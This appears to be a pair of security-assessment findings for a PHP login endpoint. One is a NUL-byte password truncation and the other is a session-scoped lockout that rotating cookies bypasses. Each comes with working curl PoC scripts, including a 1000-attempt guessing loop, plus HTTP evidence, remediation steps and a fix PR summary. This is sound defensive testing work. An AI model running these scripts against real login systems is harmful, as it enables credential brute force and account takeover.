title: NUL-byte truncation in password verification allows authentication with a NUL-suffixed password
description: The login password comparison is not length-exact: any password value containing a NUL byte (`%00`) is compared only up to that byte. As a result, submitting a **valid password followed by `%00` and arbitrary trailing data** authenticates successfully, while the same value without the NUL byte is rejected. This is a weakness in the authentication integrity check (CWE-230 Improper Handling of NUL Bytes / CWE-20).
impact: An attacker who learns or guesses a valid password prefix — or who has any means of capturing an individually-valid credential — can submit it with an appended `%00<arbitrary payload>` and still be authenticated. The client-supplied password is silently truncated by the underlying bcrypt verifier, so the effective credential space is shortened and any trailing data is discarded. This undermines the integrity of the credential check, defeats any input-normalization or length validation applied to the password, and means a password that is a correct prefix of the real password followed by a NUL byte is honored. It does not allow login without knowledge of at least the correct prefix, so on its own it is an authentication-integrity defect rather than a full unauthenticated bypass; however, it materially weakens the username/password control and should be fixed prior to any external deployment.
poc_description:
1. Request the login page and extract the `csrf_token` value together with the session cookie.
2. Submit `POST /action/login` with `Content-Type: application/x-www-form-urlencoded` and the body `csrf_token=<token>&user_type=nim&username=2341238901&password=password123%00INJECTED` (the `%00` is the URL-encoded NUL byte; percent-encoding is used so the byte is decoded by the PHP form parser).
3. Observe a `302` response with `Location: /pelanggaran` and a **new** `Set-Cookie: PHPSESSID=...` — the login succeeded.
4. As a control, repeat with `password=password123XINJECTED` (no NUL). The response is `302` with `Location: /login`, confirming the difference is caused solely by the NUL byte.
poc_script_code:
```bash
T=http://172.17.112.1:8001
JAR=/tmp/nul.jar
rm -f "$JAR"

# 1. Fetch login page + CSRF token
curl -s -c "$JAR" "$T/login" -o /tmp/login.html
TOKEN=$(grep -oP 'name="csrf_token" value="\K[^"]+' /tmp/login.html | head -1)

# 2. Valid password + %00 + arbitrary suffix  -> AUTHENTICATED
curl -s -i -b "$JAR" -X POST "$T/action/login" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-raw "csrf_token=$TOKEN&user_type=nim&username=2341238901&password=password123%00INJECTED" \
  | grep -iE '^HTTP|^Location|^Set-Cookie'

# 3. Control: same value WITHOUT the NUL byte -> REJECTED
curl -s -i -b "$JAR" -X POST "$T/action/login" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-raw "csrf_token=$TOKEN&user_type=nim&username=2341238901&password=password123XINJECTED" \
  | grep -iE '^HTTP|^Location'
```
remediation_steps: Reject credentials containing NUL bytes before they reach the password verifier, and ensure the comparison is performed on the exact, bounded byte sequence. Concretely: after reading `$_POST['password']`, if `strpos($password, "\0") !== false` then reject the login attempt and record an audit event; additionally enforce a maximum password length (e.g. 72 bytes for bcrypt) so inputs cannot be silently truncated. Prefer a verification routine whose semantics are explicitly length-delimited rather than relying on the verifier's C-string behavior. Apply the same NUL rejection to the username to keep input handling uniform. Add a regression test asserting that a valid password suffixed with `\0` plus data fails authentication.
evidence:
Request (NUL byte in password, percent-encoded as `%00`):

```http
POST /action/login HTTP/1.1
Host: 172.17.112.1:8001
Cookie: PHPSESSID=<session>
Content-Type: application/x-www-form-urlencoded
Content-Length: 96

csrf_token=<valid-token>&user_type=nim&username=2341238901&password=password123%00INJECTED
```

Response (authentication succeeds):

```http
HTTP/1.1 302 Found
Set-Cookie: PHPSESSID=49k173fdfomf8hv36du81lka5o; path=/; HttpOnly; SameSite=Lax
Location: /pelanggaran

```

Control request (same password, no NUL byte):

```http
POST /action/login HTTP/1.1
Host: 172.17.112.1:8001
Cookie: PHPSESSID=<session>
Content-Type: application/x-www-form-urlencoded

csrf_token=<valid-token>&user_type=nim&username=2341238901&password=password123XINJECTED
```

Response (authentication fails):

```http
HTTP/1.1 302 Found
Location: /login

```

Additional differential probes confirming the NUL truncation (all in scope, same endpoint):

```
password12%00junk     -> Location: /login        (prefix shorter than real password: rejected)
password124%00XYZ     -> Location: /login        (wrong base password: rejected)
password123%00XYZ     -> Location: /pelanggaran  (correct password + NUL + suffix: accepted)
%00password123        -> Location: /login        (leading NUL: rejected)
```

The same behavior was reproduced for the `dosen` account (`nidn` `1234567890`, real password `password123`): `password123%00junk` → `Location: /pelanggaran/dosen`; `password12%00junk` → `Location: /login`.
assumptions: Requires the attacker to already know (or guess) the correct password up to the point of the injected NUL byte. The finding demonstrates that the password verification is not length-exact and that trailing data after a NUL byte is silently discarded; it is not a credential-free bypass. bcrypt's handling of the NUL byte depends on the PHP/OpenSSL build; behavior was confirmed on the deployed instance.

code_locations.label: Reject NUL bytes in password before authentication

fix_pr_body:
## Summary

The login password check is not length-exact. Because bcrypt verification is NUL-terminated, submitting a valid password followed by a `%00` byte and arbitrary trailing data authenticates successfully, while the same value without the NUL byte is rejected.

## Reproduced

- `POST /action/login` with `password=password123%00INJECTED` → `302 Location: /pelanggaran` (authenticated)
- `POST /action/login` with `password=password123XINJECTED` → `302 Location: /login` (rejected)

The username field is unaffected because it is compared in full via SQL; only the password verifier truncates at NUL.

## Fix

Reject credentials containing a NUL byte in `request/handler-login.php` before calling the model, and record an audit event. This closes the silent truncation and keeps input handling uniform across username and password. A regression test should assert that a valid password suffixed with `\0` fails.

title: Login brute-force lockout is per-session only and bypassed by discarding the session cookie
description: The login brute-force protection (5 failed attempts → 15-minute lock) is stored exclusively in the PHP session. Discarding the session cookie (obtaining a fresh `PHPSESSID`) resets the counter to zero, so the lockout can be bypassed indefinitely and provides no effective limit on password guessing.
impact: The account lockout provides no protection against password guessing. An attacker can submit unlimited login attempts by simply discarding the session cookie between requests, achieving credential brute force / password spraying against any account. Because the identifiers (NIM/NIDN/NIP) and default/lab passwords are weak and predictable, an attacker can realistically recover valid student, lecturer, or administrator credentials, leading to unauthorized access to student-discipline records and, for the administrator account, the full administrative surface.
poc_description:
1. Attempt 5 invalid logins from a single session (same `PHPSESSID`): each returns `302` → `/login`. On the 6th attempt the response body carries the message "Terlalu banyak percobaan gagal. Coba lagi beberapa menit." and login is refused.
2. Discard the cookie jar (or use a new `PHPSESSID`) and attempt a login again. The counter is reset — the first attempt from the new session returns the ordinary "Invalid username or password" (no throttle), proving the lock is bound to the session and not the account, IP, or server.
3. Repeat step 2 in a loop, rotating sessions, to perform unlimited password guessing — a valid credential returns `302` → the role dashboard (e.g. `/pelanggaran`).
4. Confirm `X-Forwarded-For` rotation is irrelevant (the lock is session-scoped), and that a concurrent burst from a single session is serialized (PHP session lock) while independent sessions run without any cap.
poc_script_code:
```bash
T=http://172.17.112.1:8001

attempt() {                       # $1 = cookie jar, $2 = password
  curl -s -c "$1" "$T/login" -o /tmp/p.html
  TK=$(grep -oP 'name="csrf_token" value="\K[^"]+' /tmp/p.html | head -1)
  curl -s -o /dev/null -b "$1" -c "$1" -X POST "$T/action/login" \
    --data-urlencode "csrf_token=$TK" --data-urlencode "user_type=nim" \
    --data-urlencode "username=2341238901" --data-urlencode "password=$2"
}

# --- 1) Confirm the lock within one session ---
rm -f /tmp/locked.jar
for i in $(seq 1 6); do attempt /tmp/locked.jar "bad$i"; done
curl -s -b /tmp/locked.jar "$T/login" | grep -o 'Terlalu banyak[^<]*'
#   -> Terlalu banyak percobaan gagal. Coba lagi beberapa menit.

# --- 2) Bypass: rotate the session, keep guessing ---
for i in $(seq 1 1000); do
  JAR=/tmp/rotate_$i.jar
  rm -f "$JAR"
  attempt "$JAR" "guess$i"          # fresh PHPSESSID each time -> counter never reaches 5
done
# --- 3) A valid password from a fresh session logs straight in ---
rm -f /tmp/ok.jar
curl -s -c /tmp/ok.jar "$T/login" -o /tmp/p.html
TK=$(grep -oP 'name="csrf_token" value="\K[^"]+' /tmp/p.html | head -1)
curl -s -i -b /tmp/ok.jar -X POST "$T/action/login" \
  --data-urlencode "csrf_token=$TK" --data-urlencode "user_type=nim" \
  --data-urlencode "username=2341238901" --data-urlencode "password=password123" \
  | grep -i '^Location'
#   -> Location: /pelanggaran
```
remediation_steps: Store the failed-attempt counter and lock state server-side, keyed on an attribute the client cannot reset — the source IP address, the attempted account identifier, or both — rather than in `$_SESSION`. Record each failed attempt in a durable store (the existing `SECURITY_AUDIT_LOG` table already captures event, actor_id, sid, and ip) and enforce the 5-attempts/15-minute rule by querying recent failures for the client IP and/or identifier, not the session. Additionally: apply a small constant delay or use a per-IP global counter to slow distributed guessing; add a CAPTCHA or progressive delay after repeated failures; and alert or temporarily disable the targeted account after a threshold. Because reverse-proxy headers (`X-Forwarded-For`) are client-controllable, derive the client IP from the trusted peer address or a correctly configured trusted-proxy list. Ensure the lock applies to the account/IP even when the attacker rotates session cookies.
evidence:
Lockout confirmed (5 failures, then blocked on the 6th) within a single session:

```
attempt 1 -> Location: /login | Invalid username or password
attempt 2 -> Location: /login | Invalid username or password
attempt 3 -> Location: /login | Invalid username or password
attempt 4 -> Location: /login | Invalid username or password
attempt 5 -> Location: /login | Invalid username or password
attempt 6 -> Location: /login | Terlalu banyak percobaan gagal. Coba lagi beberapa menit.
```

Bypass — the counter resets with a brand-new session, and a valid login succeeds from a fresh session while the original session remains locked:

```
Session A (5 failures) then attempt 6      -> blocked (Terlalu banyak percobaan gagal)
Session B (new PHPSESSID), attempt 1       -> Invalid username or password (counter reset)
Session C (new PHPSESSID), VALID login     -> 302 Location: /pelanggaran  (lock bypassed)
```

Rotating `X-Forwarded-For` with a fixed session has no effect (the throttle is session-scoped, not IP-scoped):

```
5 failures with X-Forwarded-For: 10.0.0.1..5, then attempt 6 with XFF 10.0.0.99
-> Terlalu banyak percobaan gagal (session counter, XFF ignored)
```

Throughput with session rotation — 10 attempts, no lockout ever triggered; each response was the ordinary "Invalid username or password" rather than the throttle message:

```
for i in $(seq 1 10); do
  rm -f jar; curl -s -c jar $T/login -o page
  TK=$(grep -oP 'name="csrf_token" value="\K[^"]+' page|head -1)
  curl -s -o /dev/null -b jar -X POST $T/action/login \
    --data-urlencode "csrf_token=$TK" --data-urlencode "user_type=nim" \
    --data-urlencode "username=2341238901" --data-urlencode "password=guess$i"
done
# all 10 accepted as normal failures; no throttle message
```

Whitebox corroboration: the only throttle state lives in `$_SESSION` and is unset on any successful login, and the audit log table (`SECURITY_AUDIT_LOG`) is write-only — nothing enforces a limit from it:

```php title=request/handler-login.php startLineNumber=17 endLineNumber=38
        // per-session throttle (session dies w/ idle expiry). Add an IP-keyed store if deployed open-internet.
        if ((int) ($_SESSION['__login_until'] ?? 0) > time()) {
            set_app_flash_modal('error', 'Terlalu banyak percobaan gagal. Coba lagi beberapa menit.');
            app_redirect('views/auth/login.php');
        }
        ...
            $_SESSION['__login_fails'] = (int) ($_SESSION['__login_fails'] ?? 0) + 1;
            if ($_SESSION['__login_fails'] >= 5) {
                $_SESSION['__login_until'] = time() + 900;
```
assumptions: Assumes the target is reachable directly by the attacker (confirmed) and that session identifiers are attacker-controlled (i.e., the attacker can simply not send a cookie). No account lockout, CAPTCHA, or IP allow/deny exists to compensate. The credential set is small (numeric NIM/NIDN/NIP), so offline wordlists are highly effective.
